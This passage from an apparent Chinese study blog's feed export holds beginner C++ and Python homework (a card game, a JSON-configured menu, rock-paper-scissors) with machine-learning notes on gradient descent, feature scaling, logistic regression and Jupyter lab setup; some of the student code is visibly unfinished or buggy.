number">1</span><span class="token punctuation">;</span>            order<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mode <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>order <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 首次出牌且玩家出牌</span>            <span class="token comment">// 玩家出牌</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"这一轮是你首次出牌： "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我手中的牌： "</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> player<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"玩家出牌： "</span><span class="token punctuation">;</span>            string current_card<span class="token punctuation">;</span>            cin <span class="token operator">>></span> current_card<span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> current_card <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            table<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>current_card<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 玩家弹出出去的牌</span>            <span class="token keyword">auto</span> pop <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> current_card<span class="token punctuation">)</span><span class="token punctuation">;</span>            player<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>            mode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            order<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>order <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 电脑跟牌</span>            <span class="token comment">// 找出第一张大于玩家的牌</span>            string cur <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> computer<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CompareCards</span><span class="token punctuation">(</span>rank_map<span class="token punctuation">,</span> computer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cur<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"电脑跟牌："</span> <span class="token operator">&lt;&lt;</span> computer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    table<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>computer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    computer<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>computer<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> computer<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 电脑没有大于玩家的牌</span>                mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            order<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 玩家跟牌</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我手中的牌： "</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> player<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"玩家跟牌： "</span><span class="token punctuation">;</span>            string current_card<span class="token punctuation">;</span>            cin <span class="token operator">>></span> current_card<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>current_card <span class="token operator">==</span> <span class="token string">"pass"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"我要不起"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                order<span class="token operator">++</span><span class="token punctuation">;</span>                mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CompareCards</span><span class="token punctuation">(</span>rank_map<span class="token punctuation">,</span> current_card<span class="token punctuation">,</span> table<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    cout <span class="token operator">&lt;&lt;</span> current_card<span class="token punctuation">;</span>                    table<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>current_card<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 玩家弹出出去的牌</span>                    <span class="token keyword">auto</span> pop <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> current_card<span class="token punctuation">)</span><span class="token punctuation">;</span>                    player<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"无效，重新选择你的出牌："</span><span class="token punctuation">;</span>                cin <span class="token operator">>></span> current_card<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            order<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>流程图<imgsrc="https://s2.loli.net/2023/03/06/N1WFa7f9w8OUQAX.png"alt="未命名绘图 (1)" /></p></li></ul><h3 id="作业2">作业2</h3><ul><li><p>要求：人机对话，多级菜单执行操作，菜单的修改不需要对代码修改</p></li><li><p>答案</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"menu"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>            <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"打开文件"</span><span class="token punctuation">,</span>            <span class="token property">"func"</span><span class="token operator">:</span> <span class="token string">"open_file"</span><span class="token punctuation">,</span>            <span class="token property">"subMenu"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"1.1"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"增加内容"</span><span class="token punctuation">,</span>                    <span class="token property">"func"</span><span class="token operator">:</span> <span class="token string">"add_content"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"1.2"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"删除内容"</span><span class="token punctuation">,</span>                    <span class="token property">"func"</span><span class="token operator">:</span> <span class="token string">"delete_content"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>            <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"复制"</span><span class="token punctuation">,</span>            <span class="token property">"func"</span><span class="token operator">:</span> <span class="token string">"copy"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>            <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"关闭文件"</span><span class="token punctuation">,</span>            <span class="token property">"func"</span><span class="token operator">:</span> <span class="token string">"close_file"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>            <span class="token property">"level"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>            <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"退出程序"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">load_json</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        menu_json <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    menu_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>menu_json<span class="token punctuation">)</span>    menu_items <span class="token operator">=</span> menu_dict<span class="token punctuation">[</span><span class="token string">'menu'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> menu_items<span class="token keyword">def</span> <span class="token function">show_menu</span><span class="token punctuation">(</span>menu_items<span class="token punctuation">,</span> level<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> menu_item <span class="token keyword">in</span> menu_items<span class="token punctuation">:</span>        prefix <span class="token operator">=</span> <span class="token string">"  "</span><span class="token operator">*</span>level<span class="token punctuation">,</span>        <span class="token keyword">if</span> <span class="token string">'subMenu1'</span> <span class="token keyword">in</span> menu_item<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>menu_item<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>menu_item<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">)</span>            show_menu<span class="token punctuation">(</span><span class="token punctuation">[</span>menu_item<span class="token punctuation">[</span><span class="token string">'subMenu1'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> menu_item<span class="token punctuation">[</span><span class="token string">'subMenu2'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> level<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>menu_item<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>menu_item<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' '</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"增加了一万字"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"删除了一万字"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">open_file</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main_loop</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        show_menu<span class="token punctuation">(</span>menu<span class="token punctuation">)</span>        choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请选择菜单项："</span><span class="token punctuation">)</span>        found <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> menu<span class="token punctuation">[</span><span class="token string">'menu'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span> <span class="token operator">==</span> choice<span class="token punctuation">:</span>                found <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">if</span> <span class="token string">'subMenu'</span> <span class="token keyword">in</span> item<span class="token punctuation">:</span>                sub_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请选择子菜单项："</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> sub_item <span class="token keyword">in</span> </code></pre></li></ul><h3 id="课后作业1">课后作业1</h3><ul><li><p>题目：</p><ul><li>实现石头剪刀布游戏程序，人机对抗。使用字符模式开发，不要用图形模式。要画流程图再用纯代码实现，不要使用别的功能库。周三上课前完成。</li></ul></li><li><p>我思：</p><ul><li>使用数字表示各种手势，且容易比较大小</li><li>人机对抗，因此使用随机数</li><li>流程图规范<imgsrc="https://www.edrawsoft.cn/images/creat/cxulct.png"alt="程序流程图如何画？绘图软件有哪些" /></li><li><a href="https://www.iodraw.com/diagram/">流程图工具</a></li></ul></li><li><p>答案</p><ul><li>流程图<img src="https://s2.loli.net/2023/02/22/GK8eybrSsBzx9HL.png"alt="流程图png" /></li><li>代码</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">/// @brief</span><span class="token comment">/// @return</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> player_choice<span class="token punctuation">;</span>    <span class="token keyword">int</span> scissor <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> rock <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cloth <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Enter player choice: "</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> player_choice<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>player_choice<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> computer_choice <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"player_choice: "</span> <span class="token operator">&lt;&lt;</span> player_choice <span class="token operator">&lt;&lt;</span> <span class="token string">" computer_choice: "</span> <span class="token operator">&lt;&lt;</span> computer_choice <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token comment">// determine the winner</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>player_choice <span class="token operator">==</span> computer_choice<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a draw!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// this sentence is very important</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>player_choice <span class="token operator">-</span> computer_choice <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>player_choice <span class="token operator">-</span> computer_choice <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> player_choice <span class="token operator">&lt;</span> computer_choice<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Computer wins!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"player wins!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cin <span class="token operator">>></span> player_choice<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>测试<img src="https://s2.loli.net/2023/02/22/fkcHyeih2wqJZgn.png"alt="image-20230222044310576" /></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>P28-多元线性回归的梯度下降</title>
      <link href="/2023/02/18/ml06/"/>
      <url>/2023/02/18/ml06/</url>
      
        <content type="html"><![CDATA[<h3 id="模型与参数">模型与参数</h3><ul><li><p>写法<img src="https://s2.loli.net/2023/02/17/ESxjwCXKP3p2n6c.png"alt="image-20230217035330078" /></p></li><li><p>与单特征对比<imgsrc="https://s2.loli.net/2023/02/17/MR87FApI5zNa9UP.png"alt="image-20230217041839479" /></p></li></ul><h3 id="特征放缩">特征放缩</h3><ul><li><p>特征值大小与参数大小（变化范围）<imgsrc="https://s2.loli.net/2023/02/17/PoORt4YiJpSaWlu.png"alt="image-20230217050726584" /></p></li><li><p>如果不同参数的数值变化范围差异较大，那么就会形成右图那样怪异的等高线（较为困难收敛到最小值）</p><ul><li>特征值大，导致对应的参数下降的步伐大<ul><li>该参数找到合适点，但是其他参数还在寻找</li><li>该参数在左右反复横跳</li></ul></li></ul></li><li><p>方法</p><ul><li><p>最大最小值归一化：将数值缩小到范围[0,1] <spanclass="math display">\[x&#39; = \frac {x-min(x)}{max(x)-min(x)}\]</span></p></li><li></li><li><p>均值归一化：将数值范围缩放到 [-1, 1] 区间里，且数据的均值变为0<span class="math display">\[x&#39; = \frac{x-ave(x)}{max(x)-min(x)}\]</span></p></li><li><p>z-score 归一化（recommended）:数值缩放到0附近，且数据的分布变为均值为0，标准差为1的标准正态分布（先减去均值来对特征进行<strong>中心化 mean centering</strong> 处理，再除以标准差进行缩放）：<span class="math display">\[x&#39;=\frac{x-ave(x)} {\sigma}\qquad(\sigma是标准差)\]</span></p></li><li><p>最大绝对值归一化：也就是将数值变为单位长度（scaling to unitlength）,将范围数字缩放到[-1,-1]区间里： <span class="math display">\[x&#39;=\frac{x}{||max(x)||}\]</span></p></li><li><p>稳健标准化：先减去中位数，再除以四分位间距（interquartilerange）,因为不涉及极值，因此在数据里有异常值的情况下表现比较稳健： <spanclass="math display">\[x&#39;=\frac {x-median(x)}{IQR(x)}\qquadmedian(x)是中位数，IQR(x)是四分位间距。\]</span></p></li></ul></li><li><p>鼓励特征缩放，它似乎不会出错，也就是它只会让结果更符合我们预期</p></li></ul><h3 id="检查梯度下降是否收敛">检查梯度下降是否收敛</h3><ul><li><p>下降曲线</p></li><li><p>梯度下降的任务是找到使代价函数最小的参数集</p></li><li><p>Automatic convergence test</p></li></ul><h3 id="学习率的选择">学习率的选择</h3><ul><li>不同学习率对代价函数的影响<imgsrc="https://s2.loli.net/2023/02/17/zQtJuUkyO38Vf65.png"alt="image-20230217074818998" /></li></ul><h3 id="特征工程">特征工程</h3><ul><li>创造一个新特征</li><li>转化特征</li></ul><h3 id="多项式回归">多项式回归</h3><ul><li>单特征，但是创造该特征的2次幂，3次幂作为新的特征，那么此时特征缩放就很有必要<imgsrc="https://s2.loli.net/2023/02/17/PQW4lZXtHUEnsSC.png"alt="image-20230217080242019" /><ul><li>但是也可以创造其他的特征，那么对此该怎样决定创造什么特征呢</li></ul></li></ul><h3 id="分类问题">分类问题</h3><ul><li><p>线性回归不是解决分类问题的好方式</p><ul><li>一条好的拟合曲线却会造成错误分类<imgsrc="https://s2.loli.net/2023/02/17/VYKfBve2IdO3XuM.png"alt="image-20230217152146556" /></li></ul></li><li><p>逻辑回归</p><ul><li><code>sigmod</code>函数 <span class="math display">\[g(z)=\frac {1}{1+e^{-z}}\qquad 0 &lt;g(z)&lt;1 \\f_{\vec{w},b}(\vec x)=g(\vec w \cdot {\vec x}+b)=\frac{1} {1+e^{-{（\vecw \cdot \vec x}+b）}}\]</span> <img src="https://s2.loli.net/2023/02/17/EfPbNJwFD7cm5Me.png"alt="image-20230217160914294" /> <span class="math display">\[f_ {\vec w,\vec b}：描述y值的概率 \\条件概率符号：|\]</span></li></ul></li><li></li><li><p>二分类</p></li><li><p>决策边界</p><ul><li><p>使得y=0和1的概率几乎相等<imgsrc="https://s2.loli.net/2023/02/17/6jc34F7krLAvMaN.png" /></p></li><li><p>非直线的决策边界<imgsrc="https://s2.loli.net/2023/02/17/7LpPI5frKcq4mOQ.png"alt="image-20230217170739531" /></p></li><li><p>上述取决于你的多项式特征</p></li></ul></li></ul><h3 id="逻辑回归的代价函数">逻辑回归的代价函数</h3><ul><li>平方误差代价函数不适合逻辑回归<imgsrc="C:/Users/22514/AppData/Roaming/Typora/typora-user-images/image-20230217175748058.png"alt="image-20230217175748058" /> <span class="math display">\[L(f_{\vec w,b}(\vec x^{(i)},y^{i}))=\begin{cases} -log(f_{\vec w,b}(\vecx^{(i)}) \qquad if\quad y_{(i)}=1 \\-log(1-f_{\vec w,b}(\vec x^{(i)})) \qquad if\quad y_{(i)}=0\end{cases}\\f：描述的是y的概率 \\L ：单个训练样本的loss \\而我们需要的是整个训练集的loss\]</span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ML-Lab</title>
      <link href="/2023/02/11/ml04/"/>
      <url>/2023/02/11/ml04/</url>
      
        <content type="html"><![CDATA[<h3 id="实验前准备">实验前准备</h3><ul><li><p>装anaconda，就不需要单独装python了</p></li><li><p>安装最新的ANACONDA3,并更新所有的库(否则会出现很多报错</p></li></ul><pre class="language-powershell" data-language="powershell"><code class="language-powershell">conda list <span class="token operator">--</span>allconda upgrade <span class="token operator">-</span>all</code></pre><ul><li><p><del>对于一些报错需要在<strong>终端退出jupyternotebook</strong>然后重新进入</del>,修正：原因是所有代码要按顺序执行，否则会出现如下报错（这个问题困扰了好久:rage:)<img src="https://s2.loli.net/2023/02/10/hsIFC5MfTVWzja2.png"alt="image-20230210230436630" /></p></li><li><p>Aconoda 里安装jupyter notebook</p></li><li><p>配置环境变量（很重要，不确定准确需要哪些<imgsrc="https://s2.loli.net/2023/02/10/sYeVuFlXHa4rKA5.png"alt="image-20230210155854733" /></p></li><li><p>如果找不到指定模块（<ahref="https://www.cnblogs.com/xiaoqianbook/articles/14580553.html">solu</a></p></li><li><p>准备相关文件<imgsrc="https://s2.loli.net/2023/02/10/BkdEZxPWRVYlhXa.png"alt="image-20230210160240125" /></p></li><li><p>解压缩<imgsrc="https://s2.loli.net/2023/02/10/R6WfkJG9v8yjblY.png"alt="image-20230210160211710" /></p></li><li><p>命令行打开上面文件夹（输入命令<imgsrc="https://s2.loli.net/2023/02/10/bpz4nHQcauINyTC.png"alt="image-20230210160609408" /></p></li><li><p>需知<img src="https://s2.loli.net/2023/02/11/XkgAuHEGi3zh5Ro.png"alt="image-20230210163319933" /></p></li></ul><h3id="c1_w1_lab01_python_jupyter_soln熟悉jupyter-notebook">C1_W1_Lab01_Python_Jupyter_Soln（熟悉jupyternotebook）</h3><ul><li><p>code cell and markdown cell</p></li><li><p>excute code: shift+enter<imgsrc="https://s2.loli.net/2023/02/10/Uhv68j2ZDueTfIy.png"alt="image-20230210164034017" /></p></li></ul><h3id="c1_w1_lab02_model_representation_soln">C1_W1_Lab02_Model_Representation_Soln</h3><ul><li>两个py库<ul><li>NumPy, a popular library for scientific computing</li><li>Matplotlib, a popular library for plotting data<imgsrc="https://s2.loli.net/2023/02/10/QIxMZryVOCjND5Y.png"alt="image-20230210165204665" /></li></ul></li><li>完整代码</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>style<span class="token punctuation">.</span>use<span class="token punctuation">(</span><span class="token string">'./deeplearning.mplstyle'</span><span class="token punctuation">)</span><span class="token comment"># x_train is the input variable (size in 1000 square feet)</span><span class="token comment"># y_train is the target (price in 1000s of dollars)</span>x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">300.0</span><span class="token punctuation">,</span> <span class="token number">500.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"x_train = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>x_train<span class="token 